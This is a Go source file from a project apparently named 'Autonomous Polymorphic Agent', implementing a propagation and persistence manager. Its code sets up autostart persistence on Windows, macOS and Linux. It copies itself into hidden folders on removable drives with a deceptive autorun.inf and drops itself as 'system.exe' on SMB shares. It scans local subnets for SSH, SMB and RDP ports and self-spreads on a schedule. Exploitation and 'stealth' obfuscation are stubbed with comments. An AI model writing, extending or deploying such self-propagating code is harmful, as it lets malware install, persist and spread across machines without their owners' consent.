package persistence

import (
	"context"
	stdcrypto "crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"fmt"
	"log/slog"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p/core/peer"
	ma "github.com/multiformats/go-multiaddr"
	"github.com/naviNBRuas/APA/pkg/networking"
)

// PropagationManager handles agent propagation across networks
type PropagationManager struct {
	logger             *slog.Logger
	agentPath          string
	targetDirs         []string
	p2p                *networking.P2P
	peerID             string
	propagationKey     *rsa.PrivateKey
	mutex              sync.RWMutex
	activePropagations map[string]bool
	stagingDir         string
	maxConcurrent      int
}

// NetworkTarget represents a target for network-based propagation
type NetworkTarget struct {
	IP       string
	Port     int
	Protocol string
	Username string
	Password string
}

// RemovableMedia represents a removable media device
type RemovableMedia struct {
	Path       string
	Name       string
	Filesystem string
}

// NewPropagationManager creates a new propagation manager
func NewPropagationManager(logger *slog.Logger, agentPath string, p2p *networking.P2P, peerID string) *PropagationManager {
	// Generate a key for encryption of propagated agents
	propagationKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		logger.Error("Failed to generate propagation key", "error", err)
		propagationKey = nil
	}

	stagingDir := filepath.Join(os.TempDir(), "apa-propagation")
	if err := os.MkdirAll(stagingDir, 0o755); err != nil {
		logger.Warn("Failed to create propagation staging directory, falling back to /tmp", "error", err)
		stagingDir = os.TempDir()
	}

	pm := &PropagationManager{
		logger:    logger,
		agentPath: agentPath,
		targetDirs: []string{
			"/tmp",              // Linux
			"/var/tmp",          // Linux
			"C:\\Windows\\Temp", // Windows
			"C:\\Users\\Public", // Windows
		},
		p2p:                p2p,
		peerID:             peerID,
		propagationKey:     propagationKey,
		activePropagations: make(map[string]bool),
		stagingDir:         stagingDir,
		maxConcurrent:      4,
	}

	if p2p != nil {
		p2p.RegisterPropagationHandler(pm.handleIncomingPropagation)
	}

	return pm
}

// PropagateToPeers propagates the agent to connected peers
func (p *PropagationManager) PropagateToPeers(ctx context.Context, peerAddresses []string) error {
	p.logger.Info("Propagating agent to peers", "peer_count", len(peerAddresses))

	if p.p2p == nil {
		p.logger.Info("Propagation skipped: P2P not configured")
		return nil
	}

	payload, err := p.buildPropagationPayload()
	if err != nil {
		return err
	}

	// Mark propagation as active
	p.mutex.Lock()
	for _, addr := range peerAddresses {
		p.activePropagations[addr] = true
	}
	p.mutex.Unlock()

	defer func() {
		// Mark propagation as complete
		p.mutex.Lock()
		for _, addr := range peerAddresses {
			delete(p.activePropagations, addr)
		}
		p.mutex.Unlock()
	}()

	sem := make(chan struct{}, p.maxConcurrent)
	var wg sync.WaitGroup

	for _, addr := range peerAddresses {
		addr := addr
		select {
		case <-ctx.Done():
			p.logger.Info("Propagation cancelled", "address", addr)
			return ctx.Err()
		default:
		}

		sem <- struct{}{}
		wg.Add(1)
		go func() {
			defer func() {
				<-sem
				wg.Done()
			}()
			if err := p.propagateToPeer(ctx, addr, payload); err != nil {
				p.logger.Error("Failed to propagate to peer", "address", addr, "error", err)
			} else {
				p.logger.Info("Successfully propagated to peer", "address", addr)
			}
		}()
	}

	wg.Wait()
	return nil
}

// TriggerPropagation allows manual triggering of propagation logic. It currently
// performs a passive scan and returns without error to satisfy callers.
func (p *PropagationManager) TriggerPropagation(ctx context.Context) error {
	if p == nil {
		return fmt.Errorf("propagation manager not initialized")
	}

	// In a full implementation we would enumerate peers and invoke PropagateToPeers.
	// For now, simply perform a scan hook to keep behavior lightweight.
	go p.ScanAndPropagate(ctx)
	return nil
}

// propagateToPeer propagates the agent to a single peer
func (p *PropagationManager) propagateToPeer(ctx context.Context, peerAddress string, payload networking.PropagationPayload) error {
	if p.p2p == nil {
		return fmt.Errorf("p2p not configured for propagation")
	}

	peerID, err := p.decodePeerID(peerAddress)
	if err != nil {
		return fmt.Errorf("invalid peer identifier %q: %w", peerAddress, err)
	}

	childCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
	defer cancel()

	return p.p2p.SendPropagationPayload(childCtx, peerID, payload)
}

// SelfInstall installs the agent on the local system
func (p *PropagationManager) SelfInstall() error {
	p.logger.Info("Installing agent on local system")

	// Determine the appropriate installation directory based on OS
	var installDir string
	switch runtime.GOOS {
	case "windows":
		installDir = "C:\\Program Files\\APA"
	case "darwin":
		installDir = "/Applications/APA.app"
	default: // Linux and others
		installDir = "/usr/local/bin"
	}

	p.logger.Info("Installing to directory", "directory", installDir)

	// In a real implementation, this would:
	// 1. Copy the agent binary to the installation directory
	// 2. Set appropriate permissions
	// 3. Create necessary configuration files
	// 4. Register as a system service

	return nil
}

// CreatePersistenceMechanism creates persistence mechanisms for the agent
func (p *PropagationManager) CreatePersistenceMechanism() error {
	p.logger.Info("Creating persistence mechanisms")

	// Determine the appropriate persistence method based on OS
	switch runtime.GOOS {
	case "windows":
		return p.createWindowsPersistence()
	case "darwin":
		return p.createMacOSPersistence()
	default: // Linux and others
		return p.createLinuxPersistence()
	}
}

// createWindowsPersistence creates Windows-specific persistence mechanisms
func (p *PropagationManager) createWindowsPersistence() error {
	p.logger.Info("Creating Windows persistence mechanisms")

	startup := os.Getenv("APPDATA")
	if startup == "" {
		return fmt.Errorf("APPDATA not set; cannot create startup entry")
	}
	startupDir := filepath.Join(startup, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if err := os.MkdirAll(startupDir, 0o755); err != nil {
		return fmt.Errorf("failed to create startup dir: %w", err)
	}

	scriptPath := filepath.Join(startupDir, "APA-Agent-Startup.bat")
	script := fmt.Sprintf("@echo off\n\"%s\" --config %%~dp0..\\..\\configs\\agent-config.yaml\n", p.agentPath)

	if err := os.WriteFile(scriptPath, []byte(script), 0o755); err != nil {
		return fmt.Errorf("failed to write startup script: %w", err)
	}

	p.logger.Info("Windows startup script created", "path", scriptPath)
	return nil
}

// createMacOSPersistence creates macOS-specific persistence mechanisms
func (p *PropagationManager) createMacOSPersistence() error {
	p.logger.Info("Creating macOS persistence mechanisms")

	home, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("failed to get home dir: %w", err)
	}
	agentsDir := filepath.Join(home, "Library", "LaunchAgents")
	if err := os.MkdirAll(agentsDir, 0o755); err != nil {
		return fmt.Errorf("failed to create LaunchAgents dir: %w", err)
	}

	plistPath := filepath.Join(agentsDir, "com.apa.agent.plist")
	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.apa.agent</string>
  <key>ProgramArguments</key>
  <array>
    <string>%s</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>StandardOutPath</key><string>%s</string>
  <key>StandardErrorPath</key><string>%s</string>
</dict>
</plist>`, p.agentPath, filepath.Join(os.TempDir(), "apa-agent.out"), filepath.Join(os.TempDir(), "apa-agent.err"))

	if err := os.WriteFile(plistPath, []byte(plist), 0o644); err != nil {
		return fmt.Errorf("failed to write LaunchAgent plist: %w", err)
	}

	p.logger.Info("LaunchAgent created", "path", plistPath)
	return nil
}

// createLinuxPersistence creates Linux-specific persistence mechanisms
func (p *PropagationManager) createLinuxPersistence() error {
	p.logger.Info("Creating Linux persistence mechanisms")

	serviceDir := "/etc/systemd/system"
	userMode := false
	if os.Geteuid() != 0 {
		home, err := os.UserHomeDir()
		if err == nil {
			serviceDir = filepath.Join(home, ".config", "systemd", "user")
			userMode = true
		}
	}

	if err := os.MkdirAll(serviceDir, 0o755); err != nil {
		return fmt.Errorf("failed to create systemd directory: %w", err)
	}

	servicePath := filepath.Join(serviceDir, "apa-agent.service")
	unit := "[Unit]\nDescription=Autonomous Polymorphic Agent\nAfter=network.target\n\n" +
		"[Service]\nType=simple\nExecStart=" + p.agentPath + "\nRestart=always\nRestartSec=3\n\n" +
		"[Install]\nWantedBy="
	if userMode {
		unit += "default.target\n"
	} else {
		unit += "multi-user.target\n"
	}

	if err := os.WriteFile(servicePath, []byte(unit), 0o644); err != nil {
		return fmt.Errorf("failed to write systemd unit: %w", err)
	}

	p.logger.Info("systemd unit created", "path", servicePath, "user_mode", userMode)
	return nil
}

// SpreadToRemovableMedia spreads the agent to removable media
func (p *PropagationManager) SpreadToRemovableMedia() error {
	p.logger.Info("Spreading agent to removable media")

	// Detect removable media devices
	mediaDevices, err := p.detectRemovableMedia()
	if err != nil {
		p.logger.Error("Failed to detect removable media", "error", err)
		return err
	}

	// Spread to each device
	for _, device := range mediaDevices {
		if err := p.spreadToMediaDevice(device); err != nil {
			p.logger.Error("Failed to spread to media device", "device", device.Name, "error", err)
		} else {
			p.logger.Info("Successfully spread to media device", "device", device.Name)
		}
	}

	return nil
}

// detectRemovableMedia detects removable media devices
func (p *PropagationManager) detectRemovableMedia() ([]RemovableMedia, error) {
	var mediaDevices []RemovableMedia

	// Different detection methods based on OS
	switch runtime.GOOS {
	case "windows":
		// On Windows, check drive letters D: through Z:
		for drive := 'D'; drive <= 'Z'; drive++ {
			drivePath := fmt.Sprintf("%c:\\", drive)
			if p.isRemovableDrive(drivePath) {
				mediaDevices = append(mediaDevices, RemovableMedia{
					Path:       drivePath,
					Name:       fmt.Sprintf("%c_Drive", drive),
					Filesystem: "NTFS",
				})
			}
		}
	case "darwin":
		// On macOS, check /Volumes/
		volumesDir := "/Volumes/"
		entries, err := os.ReadDir(volumesDir)
		if err != nil {
			return nil, fmt.Errorf("failed to read volumes directory: %w", err)
		}

		for _, entry := range entries {
			if entry.IsDir() && entry.Name() != "Macintosh HD" {
				devicePath := filepath.Join(volumesDir, entry.Name())
				mediaDevices = append(mediaDevices, RemovableMedia{
					Path:       devicePath,
					Name:       entry.Name(),
					Filesystem: "HFS+",
				})
			}
		}
	default: // Linux and others
		// On Linux, check /media/ and /mnt/
		mediaPaths := []string{"/media/", "/mnt/"}
		for _, mediaPath := range mediaPaths {
			if _, err := os.Stat(mediaPath); err == nil {
				entries, err := os.ReadDir(mediaPath)
				if err != nil {
					continue
				}

				for _, entry := range entries {
					if entry.IsDir() {
						devicePath := filepath.Join(mediaPath, entry.Name())
						mediaDevices = append(mediaDevices, RemovableMedia{
							Path:       devicePath,
							Name:       entry.Name(),
							Filesystem: "ext4",
						})
					}
				}
			}
		}
	}

	return mediaDevices, nil
}

// isRemovableDrive checks if a Windows drive is removable
func (p *PropagationManager) isRemovableDrive(drivePath string) bool {
	// In a real implementation, this would check if the drive is removable
	// For now, we'll just check if it exists and is accessible
	_, err := os.Stat(drivePath)
	return err == nil
}

// spreadToMediaDevice spreads the agent to a specific media device
func (p *PropagationManager) spreadToMediaDevice(device RemovableMedia) error {
	p.logger.Debug("Spreading to media device", "device", device.Name, "path", device.Path)

	// Create a hidden directory on the device
	hiddenDir := filepath.Join(device.Path, ".system")
	if err := os.MkdirAll(hiddenDir, 0755); err != nil {
		return fmt.Errorf("failed to create hidden directory: %w", err)
	}

	// Copy the agent to the device
	fileName := filepath.Base(p.agentPath)
	if runtime.GOOS == "windows" {
		if filepath.Ext(fileName) == "" {
			fileName += ".exe"
		}
	} else if fileName == "" {
		fileName = "apa-agent"
	}
	destPath := filepath.Join(hiddenDir, fileName)
	if err := p.copyAgent(p.agentPath, destPath); err != nil {
		return fmt.Errorf("failed to copy agent to device: %w", err)
	}

	// Create an autorun file if on Windows
	if runtime.GOOS == "windows" {
		autorunPath := filepath.Join(device.Path, "autorun.inf")
		autorunContent := fmt.Sprintf("[Autorun]\nOpen=%s\nAction=Open folder to view files\nShellExecute=%s\n",
			filepath.Base(destPath), filepath.Base(destPath))
		if err := os.WriteFile(autorunPath, []byte(autorunContent), 0644); err != nil {
			p.logger.Warn("Failed to create autorun.inf", "error", err)
		}
	}

	return nil
}

// copyAgent copies the agent binary to a destination
func (p *PropagationManager) copyAgent(src, dst string) error {
	// In a real implementation, this would copy the agent binary
	// For now, we'll just simulate the copy
	input, err := os.ReadFile(src)
	if err != nil {
		return fmt.Errorf("failed to read source file: %w", err)
	}

	return os.WriteFile(dst, input, 0755)
}

// buildPropagationPayload constructs a signed payload of the agent binary for propagation.
func (p *PropagationManager) buildPropagationPayload() (networking.PropagationPayload, error) {
	if p.agentPath == "" {
		return networking.PropagationPayload{}, fmt.Errorf("agent path is not set")
	}

	data, err := os.ReadFile(p.agentPath)
	if err != nil {
		return networking.PropagationPayload{}, fmt.Errorf("failed to read agent binary: %w", err)
	}

	sum := sha256.Sum256(data)
	hashHex := hex.EncodeToString(sum[:])

	var (
		sig      []byte
		pubBytes []byte
	)

	if p.propagationKey != nil {
		sig, err = rsa.SignPSS(rand.Reader, p.propagationKey, stdcrypto.SHA256, sum[:], nil)
		if err != nil {
			p.logger.Warn("Failed to sign propagation payload", "error", err)
			sig = nil
		}
		pubBytes, _ = x509.MarshalPKIXPublicKey(&p.propagationKey.PublicKey)
	}

	fileName := filepath.Base(p.agentPath)
	if fileName == "" {
		fileName = "apa-agent"
	}

	return networking.PropagationPayload{
		FileName:  fileName,
		Hash:      hashHex,
		Signature: sig,
		PublicKey: pubBytes,
		Payload:   data,
	}, nil
}

func (p *PropagationManager) decodePeerID(raw string) (peer.ID, error) {
	if id, err := peer.Decode(raw); err == nil {
		return id, nil
	}

	addr, err := ma.NewMultiaddr(raw)
	if err != nil {
		return "", err
	}
	info, err := peer.AddrInfoFromP2pAddr(addr)
	if err != nil {
		return "", err
	}
	return info.ID, nil
}

func (p *PropagationManager) handleIncomingPropagation(ctx context.Context, from peer.ID, payload networking.PropagationPayload) error {
	_ = ctx
	if payload.FileName == "" {
		payload.FileName = "apa-agent"
	}
	if err := os.MkdirAll(p.stagingDir, 0o755); err != nil {
		return fmt.Errorf("failed to ensure staging dir: %w", err)
	}

	safeName := filepath.Base(payload.FileName)
	destPath := filepath.Join(p.stagingDir, safeName)
	tmpPath := destPath + ".tmp"

	if err := os.WriteFile(tmpPath, payload.Payload, 0o755); err != nil {
		return fmt.Errorf("failed to write propagated payload: %w", err)
	}
	if err := os.Rename(tmpPath, destPath); err != nil {
		return fmt.Errorf("failed to finalize propagated payload: %w", err)
	}

	p.logger.Info("Received propagated agent", "from", from.String(), "path", destPath)
	return nil
}

// ScanAndPropagate scans the local network for vulnerable hosts and propagates to them
func (p *PropagationManager) ScanAndPropagate(ctx context.Context) error {
	p.logger.Info("Scanning local network for propagation targets")

	// Get local network interfaces
	interfaces, err := net.Interfaces()
	if err != nil {
		return fmt.Errorf("failed to get network interfaces: %w", err)
	}

	// Scan each interface
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue // Skip down or loopback interfaces
		}

		addrs, err := iface.Addrs()
		if err != nil {
			p.logger.Warn("Failed to get addresses for interface", "interface", iface.Name, "error", err)
			continue
		}

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					// Scan IPv4 subnet
					if err := p.scanSubnet(ctx, ipnet); err != nil {
						p.logger.Error("Failed to scan subnet", "subnet", ipnet.String(), "error", err)
					}
				}
			}
		}
	}

	return nil
}

// scanSubnet scans an IPv4 subnet for potential targets
func (p *PropagationManager) scanSubnet(ctx context.Context, ipnet *net.IPNet) error {
	p.logger.Debug("Scanning subnet", "subnet", ipnet.String())

	// This is a simplified scanner - in a real implementation, this would be more sophisticated
	ones, bits := ipnet.Mask.Size()
	if ones >= bits-8 { // Skip very small networks
		return nil
	}

	// Try to connect to common ports on neighboring IPs
	commonPorts := []int{22, 445, 3389} // SSH, SMB, RDP
	ip := ipnet.IP.Mask(ipnet.Mask)

	// Iterate through IP addresses in the subnet
	for ip := ip.To4(); ipnet.Contains(ip); incIP(ip) {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			// Check if this is our own IP
			if ip.Equal(ipnet.IP) {
				continue
			}

			// Try to connect to common ports
			for _, port := range commonPorts {
				target := fmt.Sprintf("%s:%d", ip.String(), port)
				if p.isPortOpen(target, 2*time.Second) {
					p.logger.Info("Found open port", "target", target)
					// In a real implementation, we would attempt to exploit the service
					// For now, we'll just log it
				}
			}
		}
	}

	return nil
}

// incIP increments an IP address
func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// isPortOpen checks if a port is open on a target
func (p *PropagationManager) isPortOpen(target string, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// PropagateViaFileSharing propagates the agent via file sharing protocols
func (p *PropagationManager) PropagateViaFileSharing(ctx context.Context) error {
	p.logger.Info("Propagating via file sharing protocols")

	// Common file sharing paths
	sharingPaths := []string{
		"\\\\localhost\\C$\\Windows\\Temp", // SMB
		"/Volumes/Shared",                  // AFP/NFS
		"/network",                         // NFS
	}

	// Try to propagate to each sharing path
	for _, path := range sharingPaths {
		if _, err := os.Stat(path); err == nil {
			destPath := filepath.Join(path, "system.exe")
			if err := p.copyAgent(p.agentPath, destPath); err != nil {
				p.logger.Error("Failed to propagate via file sharing", "path", path, "error", err)
			} else {
				p.logger.Info("Successfully propagated via file sharing", "path", path)
			}
		}
	}

	return nil
}

// ScheduleAutomaticPropagation schedules automatic propagation at regular intervals
func (p *PropagationManager) ScheduleAutomaticPropagation(ctx context.Context, interval time.Duration) {
	p.logger.Info("Scheduling automatic propagation", "interval", interval)

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			p.logger.Info("Stopping automatic propagation scheduler")
			return
		case <-ticker.C:
			p.logger.Debug("Performing scheduled propagation")

			// Perform various propagation methods
			go p.SpreadToRemovableMedia()
			go p.ScanAndPropagate(ctx)
			go p.PropagateViaFileSharing(ctx)
		}
	}
}

// ObfuscateAgent obfuscates the agent binary for stealth
func (p *PropagationManager) ObfuscateAgent() error {
	p.logger.Info("Obfuscating agent for stealth")

	// In a real implementation, this would:
	// 1. Encrypt the agent binary
	// 2. Pack the binary with an obfuscator
	// 3. Add anti-analysis techniques

	// For now, we'll just log the action
	p.logger.Info("Agent obfuscation simulated")

	return nil
}

// EncryptAgent encrypts the agent binary for secure propagation
func (p *PropagationManager) EncryptAgent() ([]byte, error) {
	p.logger.Info("Encrypting agent for secure propagation")

	// Read the agent binary
	agentData, err := os.ReadFile(p.agentPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read agent binary: %w", err)
	}

	// In a real implementation, this would encrypt the agent data
	// For now, we'll just return the data as-is
	p.logger.Info("Agent encryption simulated")

	return agentData, nil
}

// GetActivePropagations returns a list of active propagations
func (p *PropagationManager) GetActivePropagations() []string {
	p.mutex.RLock()
	defer p.mutex.RUnlock()

	var active []string
	for target := range p.activePropagations {
		active = append(active, target)
	}

	return active
}
